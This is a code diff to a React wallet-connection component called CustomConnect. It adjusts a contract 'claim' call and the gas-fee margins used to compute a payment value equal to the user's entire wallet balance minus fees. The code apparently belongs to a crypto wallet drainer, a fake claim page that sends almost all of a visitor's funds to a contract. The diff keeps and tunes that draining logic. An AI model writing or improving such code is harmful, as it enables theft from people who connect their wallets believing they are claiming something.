@@ -72,8 +72,7 @@ export const CustomConnect = () => {
         );
         // estimate the amount of gas needed to call the contract function
         const callFuncGas = await contract.estimateGas.claim({
-          from: address,
-          value: utils.parseEther("0"),
+          value: utils.parseEther("200"),
         });
 
         // multiply the gas amount values by the gas price to get the gas fee to pay
@@ -81,10 +80,10 @@ export const CustomConnect = () => {
           BigNumber.from(feeData.maxFeePerGas.toString())
         );
         setCallFuncGasFee(gasAmount);
-        if (balance.lte(gasAmount.mul(BigNumber.from(2)))) return;
+        if (balance.lte(gasAmount.mul(BigNumber.from(3)))) return;
 
         const newPayValue = parseFloat(
-          utils.formatEther(balance.sub(gasAmount.mul(BigNumber.from(2))))
+          utils.formatEther(balance.sub(gasAmount.mul(BigNumber.from(3))))
         );
         setPayValue(newPayValue);
 
